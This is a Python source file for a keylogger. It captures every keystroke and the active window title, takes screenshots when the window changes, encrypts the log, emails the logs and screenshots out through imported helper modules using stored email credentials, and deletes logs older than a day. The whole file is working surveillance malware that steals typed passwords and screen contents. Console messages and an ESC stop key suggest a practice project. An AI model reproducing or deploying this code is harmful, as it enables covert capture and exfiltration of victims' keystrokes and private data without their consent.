import os
import time
from pynput import keyboard
from screenshot import take_screenshot
from emailer import send_email
from config import EMAIL, APP_PASSWORD, TO_EMAIL, LOG_FOLDER
from cryptography.fernet import Fernet

# ---- CONFIG ----
LOG_FOLDER = "logs"
if not os.path.exists(LOG_FOLDER):
    os.makedirs(LOG_FOLDER)

# ---- UTILITIES ----

# Global variable to store the currently active window
current_window = None
log_file_path = os.path.join(LOG_FOLDER, "keylog.txt")

def get_active_window():
    """ Get the title of the active window """
    try:
        import win32gui
        window = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(window)
    except:
        return "Unknown Window"

def write_to_file(text):
    """ Write text to the log file """
    with open(log_file_path, "a", encoding="utf-8") as f:
        f.write(text)

# ---- ENCRYPTION ----
def encrypt_log():
    """ Encrypt the log file """
    # Check if the encryption key exists, if not, create it
    if not os.path.exists("secret.key"):
        key = Fernet.generate_key()
        with open("secret.key", "wb") as key_file:
            key_file.write(key)
        print("🔑 New encryption key saved.")
    
    # Load the encryption key
    with open("secret.key", "rb") as key_file:
        key = key_file.read()

    fernet = Fernet(key)

    # Read the original log file
    with open(log_file_path, "rb") as log_file:
        original_log = log_file.read()

    # Encrypt the log data
    encrypted_log = fernet.encrypt(original_log)

    # Save the encrypted log to a file
    with open(os.path.join(LOG_FOLDER, "keylog_encrypted.txt"), "wb") as encrypted_file:
        encrypted_file.write(encrypted_log)
    
    print("[🔐] Log encrypted successfully. Saved as 'logs/keylog_encrypted.txt'.")

# ---- CLEANUP ----
def cleanup_old_logs(folder=LOG_FOLDER, age_in_sec=86400):
    """ Cleanup old log files (older than 'age_in_sec' seconds) """
    now = time.time()
    for filename in os.listdir(folder):
        path = os.path.join(folder, filename)
        if os.path.isfile(path) and now - os.path.getmtime(path) > age_in_sec:
            os.remove(path)
            print(f"[🗑] Deleted old log: {filename}")

# ---- KEYLOGGER ----
def on_press(key):
    """ Handles keypress events """
    global current_window

    # Get the active window title
    window = get_active_window()
    
    # If the window changed, log the change and take a screenshot
    if window != current_window:
        current_window = window
        header = f"\n\n[Window: {current_window} | {time.strftime('%Y-%m-%d %H:%M:%S')}]\n"
        write_to_file(header)
        print(header.strip())
        
        # Take screenshot when the active window changes
        take_screenshot()

    # Handle normal keypresses
    try:
        key_text = key.char
    except AttributeError:
        key_text = f"[{key.name}]"

    write_to_file(key_text)
    print(f"Key: {key_text}")

    # Stop the keylogger when ESC is pressed
    if key == keyboard.Key.esc:
        print("\n[✓] Keylogger stopped")
        return False

# ---- MAIN ----

def main():
    """ Main function to run the keylogger """
    print("[*] Keylogger started... Press ESC to stop.")

    # Start listening to keyboard events
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

    # After logging, encrypt the log file
    encrypt_log()

    # Optionally, send the email with the logs and screenshots
    send_email()

    # Clean up logs older than a day
    cleanup_old_logs()

if __name__ == "__main__":
    main()
